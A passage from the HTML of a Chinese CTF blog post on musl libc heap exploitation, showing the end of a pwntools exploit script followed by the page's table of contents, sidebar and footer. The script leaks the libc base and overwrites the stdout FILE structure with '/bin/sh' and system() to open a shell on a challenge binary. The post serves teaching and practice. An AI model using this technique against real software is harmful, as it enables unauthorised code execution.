class="number">0x10</span>, <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x292e50</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">&quot;libc_base===&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">stdout = libc_base + libc.sym[<span class="string">&quot;__stdout_FILE&quot;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">mal = libc_base + <span class="number">0x292ac0</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;e&#x27;</span>*<span class="number">0x8</span>) <span class="comment">#4(1)</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>, p64(stdout) + p64(<span class="number">0x602060</span>))</span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">b&#x27;f&#x27;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;X&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">edit(<span class="number">2</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


    </div>

    
    
    

      <footer class="post-footer">

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/2023/08/26/heap/" rel="prev" title="高版本堆块利用练习">
      <i class="fa fa-chevron-left"></i> 高版本堆块利用练习
    </a></div>
      <div class="post-nav-item">
    <a href="/2023/09/04/wp/" rel="next" title="wp">
      wp <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Musl%E7%AE%80%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">1 Musl简述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Musl-1-1-24"><span class="nav-number">2.</span> <span class="nav-text">2 Musl 1.1.24</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84"><span class="nav-number">2.1.</span> <span class="nav-text">2-1 数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#chunk"><span class="nav-number">2.1.1.</span> <span class="nav-text">chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mal-amp-bin"><span class="nav-number">2.1.2.</span> <span class="nav-text">mal &amp; bin</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-malloc-%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.2.</span> <span class="nav-text">2-2 malloc 实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#malloc"><span class="nav-number">2.2.1.</span> <span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unbin"><span class="nav-number">2.2.2.</span> <span class="nav-text">unbin</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#pretrim"><span class="nav-number">2.2.3.</span> <span class="nav-text">pretrim</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#trim"><span class="nav-number">2.2.4.</span> <span class="nav-text">trim</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-free-%E5%AE%9E%E7%8E%B0"><span class="nav-number">2.3.</span> <span class="nav-text">2-3 free 实现</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#free"><span class="nav-number">2.3.1.</span> <span class="nav-text">free</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unmap-chunk"><span class="nav-number">2.3.2.</span> <span class="nav-text">unmap_chunk</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bin-chunk"><span class="nav-number">2.3.3.</span> <span class="nav-text">__bin_chunk</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-%E9%9D%99%E6%80%81%E5%A0%86%E5%86%85%E5%AD%98%E5%88%9D%E5%A7%8B%E5%8C%96"><span class="nav-number">2.4.</span> <span class="nav-text">2-4 静态堆内存初始化</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#dls3"><span class="nav-number">2.4.1.</span> <span class="nav-text">__dls3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#reclaim-gaps-amp-reclaim"><span class="nav-number">2.4.2.</span> <span class="nav-text">reclaim_gaps &amp; reclaim</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%89%8B%E6%B3%95"><span class="nav-number">3.</span> <span class="nav-text">3 漏洞利用手法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E4%BE%8B%E9%A2%98"><span class="nav-number">4.</span> <span class="nav-text">4 例题</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BE%8B%E9%A2%98%E4%BF%A1%E6%81%AF"><span class="nav-number">4.0.1.</span> <span class="nav-text">例题信息</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-number">4.0.2.</span> <span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#EXP"><span class="nav-number">4.0.3.</span> <span class="nav-text">EXP</span></a></li></ol></li></ol></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Anza"
      src="/images/Haida.png">
  <p class="site-author-name" itemprop="name">Anza</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">14</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">9</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>


  <div class="links-of-blogroll motion-element">
    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
      Links
    </div>
    <ul class="links-of-blogroll-list">
        <li class="links-of-blogroll-item">
          <a href="https://verf1sh.github.io/" title="https:&#x2F;&#x2F;verf1sh.github.io&#x2F;" rel="noopener" target="_blank">VerF1sh</a>
        </li>
        <li class="links-of-blogroll-item">
          <a href="https://4xwi11.github.io/" title="https:&#x2F;&#x2F;4xwi11.github.io&#x2F;" rel="noopener" target="_blank">4XWi11</a>
        </li>
    </ul>
  </div>

      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2023</span>
  <span class="author" itemprop="copyrightHolder">Anza</span>
</div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

</body>
</html>
